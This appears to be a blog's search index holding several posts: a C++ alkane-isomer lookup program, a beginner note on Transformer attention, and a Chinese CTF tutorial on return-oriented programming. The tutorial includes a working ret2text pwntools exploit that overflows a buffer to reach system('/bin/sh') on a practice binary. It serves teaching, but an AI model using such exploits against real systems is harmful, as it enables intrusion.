<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>C++计算烷烃同分异构体数量(一)</title>
    <link href="/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/"/>
    <url>/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="C-计算烷烃同分异构体数量-一">C++计算烷烃同分异构体数量(一)</h2><h3 id="引子">引子</h3><p>事出有因，吾今为高一学子，昨日于化学课习及有机物，恰留意到 <code>烷烃</code> 之 <code>癸烷</code>，以变幻无端之结构组合，竟得七十五种同分异构体，吾觉甚牛而逼之，然转念思之，彼言七十五种，果如是乎？”然吾性懒，弗能以草稿纸列诸般品类而逐个数之。忽又转念，可借算法以行计算，遂成此文。</p><h6 id="smalltalk-此文因吾水平尚浅（方入-OI-约两月且资质驽钝），故于其中借助-DeepSeek-以辅助算法之设计。">smalltalk: 此文因吾水平尚浅（方入 OI 约两月且资质驽钝），故于其中借助 DeepSeek 以辅助算法之设计。</h6><h3 id="初步思考">初步思考</h3><p>首先来看看我们要通过算法实现计算烷烃同分异构体数量需要哪些基础知识(部分参考来源于DeepSeek)</p><table><thead><tr><th style="text-align:left">领域</th><th style="text-align:left">具体知识点</th></tr></thead><tbody><tr><td style="text-align:left"><strong>化学</strong></td><td style="text-align:left">烷烃通式、碳四价键规则、同分异构体概念。</td></tr><tr><td style="text-align:left"><strong>编程</strong></td><td style="text-align:left">输入输出、<code>map</code> 存储键值对、条件语句（<code>if-else</code>）。</td></tr><tr><td style="text-align:left"><strong>数学</strong></td><td style="text-align:left">查表法（避免复杂计算，直接引用已知结果）。</td></tr><tr><td style="text-align:left"><strong>问题分解</strong></td><td style="text-align:left">先验证输入合法性，再通过预存数据快速返回结果。</td></tr></tbody></table><p>进行进一步分析，得出的利用思路如下</p><h4 id="1-化学知识利用"><strong>1. 化学知识利用</strong></h4><ul><li><strong>烷烃通式</strong>：C<strong>n</strong>H<strong>2n+2</strong></li><li><strong>碳骨架规则</strong>：<ul><li>每个碳原子（C）必须形成 <strong>4 个共价键</strong>（与其他 C 或 H 原子连接）</li><li>氢原子（H）只能形成 <strong>1 个键</strong>，且不参与骨架构建</li></ul></li></ul><h4 id="2-简化问题"><strong>2. 简化问题</strong></h4><ul><li>仅计算 <strong>碳骨架的非环状结构</strong>（不考虑立体异构或复杂对称性）</li><li>手动预存小规模 <strong>n</strong> 的异构体数量（n≤10），避免复杂算法</li></ul><h4 id="3-编程实现"><strong>3. 编程实现</strong></h4><ul><li><strong>输入验证</strong>：检查 <em>H</em> 是否等于 2C+2</li><li><strong>查表法</strong>：直接返回预计算的异构体数量（适用于 C≤10）</li><li><strong>逐步扩展</strong>：未来可升级到递归生成碳骨架</li></ul><h3 id="具体分析">具体分析</h3><ol><li><p><strong>输入验证</strong></p><p>我们先检查输入的<code>H</code>的数量是否满足<code>2C+2</code>，否则进行错误回显</p></li><li><p>查表法</p><ul><li>使用 <code>map</code> 存储 n=1∼10<em>n</em>=1∼10 的异构体数量（刚好到癸烷）</li><li>例如：<ul><li><strong>n=4</strong> -&gt; 2种异构体（正丁烷、异丁烷）</li><li><strong>n=5</strong> -&gt; 3种异构体</li></ul></li></ul></li><li><p>输出结果</p><ul><li>直接返回表中对应的异构体数量，若 n&gt;10 则提示不支持</li></ul></li></ol><p>现在是最终优化过的代码</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;map&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-type">int</span> carbon, hydrogen;    <span class="hljs-comment">// 提示用户输入碳原子数</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of carbon atoms (C): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;carbon);        <span class="hljs-comment">// 提示用户输入氢原子数</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the number of hydrogen atoms (H): &quot;</span>);    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;hydrogen);        <span class="hljs-comment">// 验证是否为烷烃（CnH2n + 2）</span>    <span class="hljs-keyword">if</span> (hydrogen != <span class="hljs-number">2</span> * carbon + <span class="hljs-number">2</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: This is not an alkane (expected H = 2C + 2).\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;    <span class="hljs-comment">// 预计算的烷烃异构体数量（n = 1~10）</span>    map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; isomerTable = &#123;        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// CH4</span>        &#123;<span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C2H6</span>        &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;,  <span class="hljs-comment">// C3H8</span>        &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;,  <span class="hljs-comment">// C4H10（正丁烷、异丁烷）</span>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">3</span>&#125;,  <span class="hljs-comment">// C5H12</span>        &#123;<span class="hljs-number">6</span>, <span class="hljs-number">5</span>&#125;,  <span class="hljs-comment">// C6H14</span>        &#123;<span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;,  <span class="hljs-comment">// C7H16</span>        &#123;<span class="hljs-number">8</span>, <span class="hljs-number">18</span>&#125;, <span class="hljs-comment">// C8H18</span>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">35</span>&#125;, <span class="hljs-comment">// C9H20</span>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">75</span>&#125; <span class="hljs-comment">// C10H22</span>    &#125;;    <span class="hljs-keyword">if</span> (carbon &gt;= <span class="hljs-number">1</span> &amp;&amp; carbon &lt;= <span class="hljs-number">10</span>) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Number of alkane isomers for C%dH%d: %d\n&quot;</span>, carbon, hydrogen, isomerTable[carbon]);    &#125;     <span class="hljs-keyword">else</span> &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: Carbon count must be 1~10 (this program is for beginners).\n&quot;</span>);  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>当然，我们只能计算碳原子数量为10的烷烃，表现出我们的功能完全不够强大，我也思考了关于后续补充的一些其他想法，诸如升级递归算法、引入图论(马上把基础打完滚去学树)甚至是结合动态规划或生成函数优化计算(需学习组合数学)，后续我还会更新的 敬请期待！</p><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Learning Note on Attention is All You Need</title>
    <link href="/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/"/>
    <url>/2025/05/10/Learning-Note-on-Attention-is-All-You-Need/</url>
    
    <content type="html"><![CDATA[<hr><p><em><a href="https://github.com/Solkatt-cn/LLMStudyNotes/tree/main/Google2017AttentionIsAllYouNeed/note.md">You also could click here to download this article.</a></em></p><h3 id="Learning-Note-on-“Attention-Is-All-You-Need”">Learning Note on “Attention Is All You Need”</h3><h4 id="For-Absolute-Beginners">For Absolute Beginners:</h4><ol><li>Only basic math required (+, -, ×, ÷)</li><li>All technical terms explained using 🍔🍰 examples</li><li>Key concepts marked with (⭐)</li></ol><hr><h3 id="1-Why-Was-Transformer-Invented">1. Why Was Transformer Invented?</h3><h4 id="1-1-Problems-with-Old-AI-RNN-LSTM-Why-are-traditional-models-like-“pass-the-word-game”">1.1 Problems with Old AI (RNN/LSTM): Why are traditional models like “pass the word game”?</h4><p>Imagine you are playing a game of pass the word game, and the rules are as follows:</p><p>1.<strong>Strict order</strong>: You must pass the word A→B→C→D one by one, and you cannot skip anyone</p><p>2.<strong>Memory decay</strong>: When it reaches the 10th person, the words said by the first person may have changed beyond recognition</p><p>3.<strong>Low efficiency</strong>: You must wait for the previous person to finish speaking</p><h4 id="1-2-How-Humans-Process-Information">1.2 How Humans Process Information</h4><h5 id="Empirical-Observation">Empirical Observation</h5><p>When reading the sentence:<br>“Although it’s raining, __ forgot an umbrella”<br>Human cognition demonstrates:</p><ol><li><strong>Semantic Association</strong>: Instantaneous strong linkage between “raining” and “umbrella”</li><li><strong>Non-sequential Processing</strong>: Accurate prediction of the missing pronoun (“he/she”) without word-by-word reading</li><li><strong>Contextual Integration</strong>: Automatic suppression of irrelevant information (e.g., the concessive “although”) while focusing on critical concepts</li></ol><h4 id="Cognitive-Science-and-Attention-Mechanism-Alignment">Cognitive Science and Attention Mechanism Alignment</h4><p>This phenomenon directly inspired the <strong>Attention Mechanism</strong> in Transformers:</p><ul><li><p><strong>Key-Value-Query Model</strong><br>The human brain analogously performs:</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/1.png" alt="1"></p></li></ul><p>Then I’ll explain the formula to you with the understanding of a high school student, Imagine you’re in the cafeteria for lunch (that’s the attention mechanic!).：</p><p><strong>Q (Query) - What you need</strong><br>“What do I want to eat today?” (e.g. want to eat spicy food, want to have a full stomach)</p><p><strong>K (Key) - The signboard of the window</strong><br>Menu for each rice window (Window 1: Spicy Fragrant Pot; Window 2: Beef noodles… ）<br><img src="/images/Learning-Note-on-Attention-is-All-You-Need/2.png" alt></p><p><strong>Degree of matching</strong><br>You take your requirement (Q) and compare it with the menu (K) of each window:</p><ul><li><p>Spicy fragrant pot: spicy ✅, full-filling ✅, → high score</p></li><li><p>Beef noodles: slightly spicy ❌ and filling ✅→ medium</p></li><li><p>Salad: not spicy ❌, not full ❌→ Low score</p><p><img src="/images/Learning-Note-on-Attention-is-All-You-Need/3.png" alt="3"></p></li></ul><p><strong>Prevent “Difficulty in Selection”</strong><br>If there are too many menu options (d_k too big), you need to divide by the root number d_k make the score more reasonable, so that all the scores are too high to make a difficult choice</p><p><strong>Softmax - Make a choice</strong><br>Convert fractions into probabilities:</p><ul><li>Spicy Pot: 70%</li><li>Beef noodles: 25%</li><li>Salad: 5%<br>(It’s like turning fractions into percentages)</li></ul><p><strong>V (Value)—Final decision</strong><br><em>Allocate attention based on probability:</em></p><ol><li>70% of the “attention funds” are invested in spicy fragrant pot</li><li>25% to beef noodles</li><li>5% to salads</li><li>The whole process is:<br>You (Q) go to the cafeteria with your needs, compare the menus (K), calculate the matching degree (QK^T), prevent too many options (√d_k), use Softmax to calculate the probability, and finally decide how to distribute the meal money (V)!</li></ol><ul><li><ul><li>So when processing “raining” (as Query), it automatically retrieves association strength (Value) with “umbrella” (Key)</li></ul></li><li><strong>Global Perception</strong><br>Sequential processing in traditional RNNs vs. human parallel processing → Transformer’s self-attention design</li></ul><h4 id="Core-Implications-Attention-Is-All-You-Need">Core Implications (<em>Attention Is All You Need</em>)</h4><ol><li><strong>Long-Range Dependency</strong><br>Humans handle “Although…umbrella” without distance constraints → Transformer’s attention window overcomes RNN gradient vanishing</li><li><strong>Dynamic Weight Allocation</strong><br>Humans assign higher weight to “umbrella” → Model’s attention scores automatically learn feature importance</li><li><strong>Cross-Modality Generality</strong><br>The same mechanism applies to vision (local image regions) and speech (phoneme alignment)</li></ol><h4 id="Comparative-Evidence">Comparative Evidence</h4><table><thead><tr><th style="text-align:left">Processing Mode</th><th style="text-align:left">Human Performance</th><th style="text-align:left">Transformer Performance</th></tr></thead><tbody><tr><td style="text-align:left">Association Span</td><td style="text-align:left">Unlimited distance</td><td style="text-align:left">Theoretically infinite</td></tr><tr><td style="text-align:left">Processing Speed</td><td style="text-align:left">200-300ms/concept</td><td style="text-align:left">O(1)-level parallelism</td></tr><tr><td style="text-align:left">Error Patterns</td><td style="text-align:left">Semantic interference (e.g., “sunny”)</td><td style="text-align:left">Similarity matrix confusion</td></tr></tbody></table><blockquote><p>Key Conclusion: The attention mechanism mathematically models human information processing, validating the cognitive hypothesis that “association takes precedence over sequence”.</p></blockquote><script src="https://giscus.app/client.js" data-repo="p4y1oad/p4y1oad.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ML / LLM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI/ML</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basic ROP Learning</title>
    <link href="/2025/04/19/Basic-ROP-Learning/"/>
    <url>/2025/04/19/Basic-ROP-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="Basic-ROP-Learning">Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述">ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><h3 id="1-基本概念">1. <strong>基本概念</strong></h3><h4 id="（1）产生背景">（1）产生背景</h4><ul><li><p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p></li><li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p></li><li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p></li></ul><h4 id="（2）核心原理">（2）核心原理</h4><ul><li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p></li><li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p></li></ul><hr><h3 id="2-关键组件">2. <strong>关键组件</strong></h3><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td><strong>Gadget</strong></td><td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td></tr><tr><td><strong>ROP Chain</strong></td><td>由多个gadget地址和参数组成的栈数据，控制程序执行流。</td></tr><tr><td><strong>Stack Pivot</strong></td><td>将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td></tr></tbody></table><hr><h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3><ol><li><p><strong>信息泄露</strong></p><ul><li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li></ul></li><li><p><strong>寻找Gadgets</strong></p><ul><li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li></ul></li><li><p><strong>构造ROP Chain</strong></p><ul><li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li></ul></li><li><p><strong>触发漏洞</strong></p><ul><li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li></ul></li></ol><hr><h3 id="4-防御措施">4. <strong>防御措施</strong></h3><table><thead><tr><th>防御技术</th><th>原理</th></tr></thead><tbody><tr><td><strong>ASLR</strong></td><td>随机化内存布局，增加gadget地址预测难度。</td></tr><tr><td><strong>Stack Canary</strong></td><td>在栈帧中插入校验值，防止返回地址被覆盖。</td></tr><tr><td><strong>CFI</strong></td><td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td></tr><tr><td><strong>PIC/PIE</strong></td><td>位置无关代码，增强ASLR效果。</td></tr></tbody></table><h3 id="5-实例-Linux-x86-ROP-Exploit">5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text">(1) ret2text</h5><ul><li><h4 id="基本分析"><strong>基本分析</strong></h4></li></ul><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p><p>先看看程序的保护机制</p><div class="code-wrapper"><pre><code class="hljs Bash">~ checksec ret2text[*] <span class="hljs-string">&#x27;/ret2text&#x27;</span>    Arch:       i386-32-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x8048000)    Stripped:   No    Debuginfo:  Yes</code></pre></div><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><div class="code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);  <span class="hljs-built_in">gets</span>(s);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80485FD secure          proc near.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD input           = dword ptr <span class="hljs-number">-10</span>h.text:<span class="hljs-number">0</span>80485FD secretcode      = dword ptr <span class="hljs-number">-0</span>Ch.text:<span class="hljs-number">0</span>80485FD.text:<span class="hljs-number">0</span>80485FD ; __unwind &#123;.text:<span class="hljs-number">0</span>80485FD                 push    ebp.text:<span class="hljs-number">0</span>80485FE                 mov     ebp, esp.text:<span class="hljs-number">0</span>8048600                 sub     esp, <span class="hljs-number">28</span>h.text:<span class="hljs-number">0</span>8048603                 mov     dword ptr [esp], <span class="hljs-number">0</span> ; timer.text:<span class="hljs-number">0</span>804860A                 call    _time.text:<span class="hljs-number">0</span>804860F                 mov     [esp], eax      ; seed.text:<span class="hljs-number">0</span>8048612                 call    _srand.text:<span class="hljs-number">0</span>8048617                 call    _rand.text:<span class="hljs-number">0</span>804861C                 mov     [ebp+secretcode], eax.text:<span class="hljs-number">0</span>804861F                 lea     eax, [ebp+input].text:<span class="hljs-number">0</span>8048622                 mov     [esp<span class="hljs-number">+4</span>], eax.text:<span class="hljs-number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760.text:<span class="hljs-number">0</span>804862D                 call    ___isoc99_scanf.text:<span class="hljs-number">0</span>8048632                 mov     eax, [ebp+input].text:<span class="hljs-number">0</span>8048635                 cmp     eax, [ebp+secretcode].text:<span class="hljs-number">0</span>8048638                 jnz     <span class="hljs-type">short</span> locret_8048646.text:<span class="hljs-number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="hljs-string">&quot;/bin/sh&quot;</span>.text:<span class="hljs-number">0</span>8048641                 call    _system </code></pre></div><p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p><div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s].text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s.text:<span class="hljs-number">0</span>80486AE                 call    _gets.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>.text:<span class="hljs-number">0</span>80486BA                 call    _printf.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div><p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p><div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span><span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span><span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span><span class="hljs-function">gef➤ b *0x080486AE </span><span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span><span class="hljs-function">gef➤ r </span><span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span><span class="hljs-function"></span><span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span><span class="hljs-function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  →  <span class="hljs-number">0x00229dac</span></span><span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span><span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  →  <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span><span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  →  <span class="hljs-number">0xf7ffd020</span>  →  <span class="hljs-number">0xf7ffda40</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  →  <span class="hljs-number">0xffffd1fc</span>  →  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span><span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  →  <span class="hljs-number">0x00000000</span></span><span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  →  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span><span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div><ul><li><h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4></li></ul><p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p><ul><li><h4 id="验证猜想"><strong>验证猜想</strong></h4><p>通过我们上面的分析可以构造以下payload:</p></li></ul><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))sh.interactive()</code></pre></div><p>得到以下输出，想想是哪里出了问题呢？</p><div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive$ <span class="hljs-built_in">ls</span>[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div><p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p><div class="code-wrapper"><pre><code class="hljs x86asm">总偏移 = buf 到 <span class="hljs-built_in">EBP</span> 的距离 (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> 自身大小 (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div><p>因此，正确的payload是：</p><div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)target = <span class="hljs-number">0x804863a</span><span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))sh.interactive()</code></pre></div><p>输出如下：</p><div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766[*] Switching to interactive modeThere is something amazing here, <span class="hljs-keyword">do</span> you know anything?Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>exp.py  flag  ret2text$ <span class="hljs-built_in">cat</span> flagflag&#123;This_is_the_right_payload&#125;$[*] Interrupted[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div><p>不断更新，敬请期待！</p><h6 id="参考文献及相关资料来源">参考文献及相关资料来源</h6><p><a href="https://ctf-wiki.org/">CTF-Wiki</a><br><a href="https://chat.deepseek.com/">DeepSeek</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-lab靶场小计</title>
    <link href="/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/"/>
    <url>/2025/02/22/upload-lab%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/</url>
    
